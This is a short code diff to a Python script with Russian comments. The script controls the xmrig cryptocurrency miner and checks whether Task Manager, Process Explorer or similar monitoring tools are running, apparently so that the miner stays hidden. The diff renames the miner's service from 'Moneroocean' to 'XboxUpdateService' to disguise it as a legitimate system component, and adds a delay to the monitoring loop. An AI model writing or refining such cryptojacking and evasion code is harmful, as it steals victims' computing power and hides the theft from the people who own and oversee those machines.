@@ -5,7 +5,7 @@ import subprocess
 from pynput.mouse import Controller
 
 SOFTS_NAME = ['Taskmgr.exe', 'perfmon.exe', 'procexp64.exe', 'procexp.exe', 'mmc.exe']
-SERVICE_NAME = 'Moneroocean'
+SERVICE_NAME = 'XboxUpdateService'
 MINER_NAME = ['xmrig.exe']
 
 
@@ -51,6 +51,7 @@ while True:
         else:
             # print('майнер не запущен - ничего не делаю')
             pass
+        time.sleep(60)
     else:
         # print('He 3апущен диспетчер задач')
         if not find_procs_by_name(MINER_NAME):
